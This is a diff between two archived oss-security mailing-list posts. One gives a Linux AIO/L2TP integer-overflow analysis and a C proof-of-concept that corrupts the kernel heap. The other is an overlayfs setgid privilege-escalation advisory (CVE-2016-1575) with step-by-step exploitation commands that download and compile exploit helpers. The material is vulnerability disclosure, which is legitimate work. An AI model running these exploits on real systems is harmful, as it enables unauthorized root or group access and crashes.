@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["6785" "Sunday" "5" "June" "2016" "19:05:11" "+0300" "Solar Designer" "solar@openwall.com" "<20160605160511.GA18786@openwall.com>" "160" "Re: [oss-security] CVE Request: Linux: aio write triggers integer overflow in some network protocols" nil nil nil "6" "2016060516:05:11" "[oss-security] CVE Request: Linux: aio write triggers integer overflow in some network protocols" (number mark "U       solar@openwa Jun  5  160/6785  " thread-indent "\"Re: [oss-security] CVE Request: Linux: aio write triggers integer overflow in some network protocols\"\n") "<20160302165826.F2E3034E00C@smtpvbsrv1.mitre.org>" ("<20160301161155.GA4786@eldamar.local>" "<20160302165826.F2E3034E00C@smtpvbsrv1.mitre.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4133" "Wednesday" "24" "February" "2016" "05:58:04" "+0000" "halfdog" "me@halfdog.net" "<7da766ba-0f9d-5902-9267-66c38cd31f4e@halfdog.net>" "128" "[oss-security] User Namespaces Overlayfs Xattr Setgid Privilege Escalation: Overlayfs" nil nil nil "2" "2016022405:58:04" "[oss-security] User Namespaces Overlayfs Xattr Setgid Privilege Escalation: Overlayfs" (number mark "U       me@halfdog.n Feb 24  128/4133  " thread-indent "\"[oss-security] User Namespaces Overlayfs Xattr Setgid Privilege Escalation: Overlayfs\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 27824 invoked by uid 550); 5 Jun 2016 16:05:50 -0000
+Received: (qmail 29933 invoked by uid 550); 24 Feb 2016 06:04:00 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,176 +12,143 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 27799 invoked from network); 5 Jun 2016 16:05:49 -0000
-Date: Sun, 5 Jun 2016 19:05:11 +0300
-From: Solar Designer <solar@openwall.com>
+Received: (qmail 29857 invoked from network); 24 Feb 2016 06:03:47 -0000
+From: halfdog <me@halfdog.net>
 To: oss-security@lists.openwall.com
-Message-ID: <20160605160511.GA18786@openwall.com>
-References: <20160301161155.GA4786@eldamar.local> <20160302165826.F2E3034E00C@smtpvbsrv1.mitre.org>
-Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="Qxx1br4bt0+wmkIi"
-Content-Disposition: inline
-In-Reply-To: <20160302165826.F2E3034E00C@smtpvbsrv1.mitre.org>
-User-Agent: Mutt/1.4.2.3i
-Subject: Re: [oss-security] CVE Request: Linux: aio write triggers integer overflow in some network protocols
+Message-ID: <7da766ba-0f9d-5902-9267-66c38cd31f4e@halfdog.net>
+Date: Wed, 24 Feb 2016 05:58:04 +0000
+User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+Subject: [oss-security] User Namespaces Overlayfs Xattr Setgid Privilege Escalation:
+ Overlayfs
 
---Qxx1br4bt0+wmkIi
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-On Wed, Mar 02, 2016 at 11:58:26AM -0500, cve-assign@mitre.org wrote:
-> > https://git.kernel.org/linus/4c185ce06dca14f5cea192f5a2c981ef50663f2b
-> > https://git.kernel.org/cgit/linux/kernel/git/stable/linux-stable.git/commit?id=c4f4b82694fe48b02f7a881a1797131a6dad1364
-> 
-> > For an upcoming Linux DSA in Debian we would use something like:
-> 
-> >> Ben Hawkes of Google Project Zero reported that the AIO interface
-> >> permitted reading or writing 2 GiB of data or more in a single
-> >> chunk, which could lead to an integer overflow when applied to
-> >> certain filesystems, socket or device types. The full security
-> >> impact has not been evaluated.
-> 
-> Use CVE-2015-8830.
+[http://www.halfdog.net/Security/2016/UserNamespaceOverlayfsXattrSetgidPrivilegeEscalation/]
 
-I don't know if the Project Zero issue was already public in March or
-was made public upon expiration of 90 days in May, but either way I'd
-like its additional detail archived in this same thread, so here goes:
+Introduction:
+=============
 
-https://bugs.chromium.org/p/project-zero/issues/detail?id=735
+* Problem description:
 
-| Linux io_submit L2TP sendmsg integer overflow 	
-| Project Member Reported by hawkes@google.com, Feb 20, 2016
-| 
-| In certain kernel versions it is possible to use the AIO subsystem (io_submit syscall) to pass size values larger than MAX_RW_COUNT to the networking subsystem's sendmsg implementation. In the L2TP PPP sendmsg implementation, a large size parameter can lead to an integer overflow and kernel heap corruption during socket buffer allocation. This could be exploited to allow local privilege escalation from an unprivileged user account.
-| 
-| This issue affects 64-bit systems running older branches of the Linux kernel, such as version 3.10 and 3.18. More recent major versions aren't affected due to refactoring in the AIO subsystem. The attached proof-of-concept trigger has been tested on a fully updated Ubuntu 14.04 LTS server. This issue is also likely to affect 64-bit Android devices, which typically use branches of 3.10.
-| 
-| The first observation is that an IOCB_CMD_PWRITE of a large length (such as 0xffffffff) will correctly bound the request iocb's ki_nbytes value to MAX_RW_COUNT. However, in the single vector case, if the relevant access_ok check passes in aio_setup_single_vector then the iov length will still be large (0xffffffff). On 64-bit systems it is possible for access_ok(type, user_ptr, 0xffffffff) to succeed.
-| 
-| The second observation is that sock_aio_write does not use the iocb for the sendmsg size calculation, but instead takes the summation of all input iov lengths. Thus calling io_submit with an IOCB_CMD_PWRITE operation on a socket will result in a potentially large value being passed to sendmsg.
-| 
-| The third observation is that AF_PPPOX sockets using the PX_PROTO_OL2TP protocol has a sendmsg implementation that does not bounds check the incoming length parameter (called total_len) before using the value to calculate the length of a socket buffer allocation (using sock_wmalloc).
-| 
-| The fourth observation is that the underlying socket buffer allocation routine __alloc_skb uses an "unsigned int" for it's size parameter rather than a size_t, and that this value can wrap to a small positive value upon alignment calculations and internal space overhead calculations. This results in a small value being passed to kmalloc for the socket buffer data allocation. Then, the size is recalculated using SKB_WITH_OVERHEAD, which effectively re-underflows the size calculation to a small negative value (large unsigned value). The newly created socket buffer has a small backing data buffer and a large size.
-| 
-| The proof-of-concept trigger crashes when writing the skb_shared_info structure into the end of the socket buffer, which is out-of-bounds. Other corruption may also be possible in pppol2tp_sendmsg/l2tp_xmit_skb/ip_output.
+Linux user namespace allows to mount file systems as normal user,
+including the overlayfs. As many of those features were not designed
+with namespaces in mind, this increase the attack surface of the Linux
+kernel interface.
 
-I've also attached l2tp_ppp_sendmsg.c, which was attached to the above
-Project Zero issue.
+Overlayfs was intended to allow create writeable filesystems when
+running on readonly medias, e.g. on a live-CD. In such scenario, the
+lower filesystem contains the read-only data from the medium, the
+upper filesystem part is mixed with the lower part. This mixture is
+then presented as an overlayfs at a given mount point. When writing to
+this overlayfs, the write will only modify the data in upper, which
+may reside on a tmpfs for that purpose.
 
-I haven't looked into the actual issue yet, but a reason why I am
-posting this is to once again request this kind of detail to be posted
-in here by others.
+Due to inheritance of Posix ACL information (xattrs) when copying up
+overlayfs files and not cleaning those additional and unintended ACL
+attribues, SGID directories may become user writable, thus allowing to
+gain privileges of this group using methods described in [0]. On
+standard Ubuntu system, this allows to gain access to groups staff,
+mail, libuuid.
 
-Red Hat's statement:
 
-https://access.redhat.com/security/cve/cve-2015-8830
+Methods:
+========
 
-RHEL5 not affected, 6 and 7 are (were?)
+* Target Selection:
 
-> > The issue was initially already addressed via
-> > 
-> > https://git.kernel.org/linus/a70b52ec1aaeaf60f4739edb1b422827cb6f3893 (v3.5-rc1)
-> 
-> >> vfs: make AIO use the proper rw_verify_area() area helpers
-> 
-> >> We had for some reason overlooked the AIO interface, and it didn't use
-> >> the proper rw_verify_area() helper function that checks (for example)
-> >> mandatory locking on the file, and that the size of the access doesn't
-> >> cause us to overflow the provided offset limits etc.
-> 
-> Use CVE-2012-6701.
+Suitable target directories can be easily found using find / -perm
+- -02020 2> /dev/null. On standard Ubuntu system those are:
 
-https://access.redhat.com/security/cve/cve-2012-6701
+/usr/local/lib/python3.4 (root.staff)
+/var/lib/libuuid (libuuid.libuuid)
+/var/local (root.staff)
+/var/mail (root.mail)
+Exploitation:
 
-RHEL5 is affected and "won't fix" ("rated as having Moderate security
-impact and is not currently planned to be addressed in future updates"),
-6 (was?) affected, 7 was not.  I wonder what the reasoning for the
-Moderate severity rating was.
+Exploitation can be done just combining standard tools with the [0]
+exploit. The following steps include command variants needed for
+different operating systems. They have to be executed in two
+processes, one inside the user namespace, the other one outside of it.
 
-Alexander
+Inside:
 
---Qxx1br4bt0+wmkIi
-Content-Type: text/x-c; charset=us-ascii
-Content-Disposition: attachment; filename="l2tp_ppp_sendmsg.c"
+test$ wget -q
+http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/CreateSetgidBinary.c
+http://www.halfdog.net/Misc/Utils/UserNamespaceExec.c
+http://www.halfdog.net/Misc/Utils/SuidExec.c
+test$ gcc -o CreateSetgidBinary CreateSetgidBinary.c
+test$ gcc -o UserNamespaceExec UserNamespaceExec.c
+test$ gcc -o SuidExec SuidExec.c
+test$ ./UserNamespaceExec -- /bin/bash
+root# mkdir mnt test work
+root# mount -t overlayfs -o lowerdir=[parent of
+targetdir],upperdir=test overlayfs mnt # Ubuntu Trusty
+root# mount -t overlayfs -o lowerdir=[parent of
+targetdir],upperdir=test,workdir=work overlayfs mnt # Ubuntu Wily
 
-#include <stdio.h>
-#include <string.h>
-#include <errno.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <linux/if.h>
-#include <linux/if_pppox.h>
-#include <sys/mman.h>
-#include <sys/syscall.h>
-#include <linux/aio_abi.h>
+Outside:
 
-int main(int argc, char *argv[]) {
-	struct sockaddr_pppol2tp sax;
-	struct sockaddr_in addr;
-	int s, sfd, ret;
-	struct iocb *iocbp;
-	struct iocb iocb;
-	aio_context_t ctx_id = 0;
-	void *data;
+test$ setfacl -m d:u:test:rwx test # Ubuntu Trusty
+test$ setfacl -m d:u::rwx,d:u:test:rwx work/work # Ubuntu Wily
 
-	s = socket(AF_PPPOX, SOCK_DGRAM, PX_PROTO_OL2TP);
+Inside:
 
-	if (s == -1) {
-		perror("socket");
-		return -1;
-	}
+root# chmod 02777 mnt/[targetdir]
+root# umount mnt
 
-	memset(&sax, 0, sizeof(struct sockaddr_pppol2tp));
+Outside:
 
-	sax.sa_family = AF_PPPOX;
-	sax.sa_protocol = PX_PROTO_OL2TP;
+test$ ./CreateSetgidBinary test/[targetdir]/escalate /bin/mount x
+nonexistent-arg
+test$ test/[targetdir]/escalate ./SuidExec /bin/bash
+test$ touch x
+test$ ls -al x
+- -rw-r--r-- 1 test [targetgroup] 0 Jan 16 20:39 x
 
-	sax.pppol2tp.fd = -1;
-	sax.pppol2tp.addr.sin_addr.s_addr = addr.sin_addr.s_addr;
-	sax.pppol2tp.addr.sin_port = addr.sin_port;
-	sax.pppol2tp.addr.sin_family = AF_INET;
-	sax.pppol2tp.s_tunnel  = -1;
-	sax.pppol2tp.s_session = 0;
-	sax.pppol2tp.d_tunnel  = -1;
-	sax.pppol2tp.d_session = 0;
+Results, Discussion:
+====================
 
-	sfd = connect(s, (struct sockaddr *)&sax, sizeof(sax));
+On Ubuntu, exploitation allows interference with mail spool and allows
+to gain privileges of other python processes using python
+dist-packages owned by user root.staff. If root user calls a python
+process in that way, e.g. via apport crash dump tool, local root
+escalation is completed.
 
-	if (sfd == -1) {
-		perror("connect");
-		return -1;
-	}
+According to [1], directories or binaries owned by group staff are in
+the default PATH of the root user, hence local root escalation is trivial.
 
-	data = mmap(NULL, 0x100001000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+Timeline:
+=========
 
-	if (data == MAP_FAILED) {
-		perror("mmap");
-		return -1;
-	}
+* 20160116: Discovery, report at Launchpad [2]
+* 20160122: Patch to disable unprivileged userns due to this and other
+issues [3]
+* 20160217: CVE-2016-1575 linked on launchpad [4]
+* 20161122: CRD and publication
 
-	memset(data, 0x41, 0x100001000);
+References:
+===========
 
-	ret = syscall(__NR_io_setup, 2, &ctx_id);
+[0]
+http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/
+[1] http://www.openwall.com/lists/oss-security/2016/01/16/7
+[2] https://bugs.launchpad.net/bugs/1534961
+[3] https://lkml.org/lkml/2016/1/22/7
+[4] http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1575
 
-	if (ret == -1) {
-		perror("io_setup");
-		return -1;
-	}
+hd
 
-	memset(&iocb, 0, sizeof(struct iocb));
+- -- 
+http://www.halfdog.net/
+PGP: 156A AE98 B91F 0114 FE88  2BD8 C459 9386 feed a bee
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-	iocb.aio_fildes = s;
-	iocb.aio_lio_opcode = IOCB_CMD_PWRITE;
-	iocb.aio_nbytes = 0xfffffe60;
-	iocb.aio_buf = (unsigned long) &data;
-
-	iocbp = &iocb;
-
-	syscall(__NR_io_submit, ctx_id, 1, &iocbp);
-
-	return 0;
-}
-
---Qxx1br4bt0+wmkIi--
+iEYEARECAAYFAlbNRmEACgkQxFmThv7tq+7ouwCfXDh+7HyLW11LYgPWluK/+f3j
+dMsAnAodbxwlOd0oMnEjeoa9QCFFoBqq
+=ubsA
+-----END PGP SIGNATURE-----
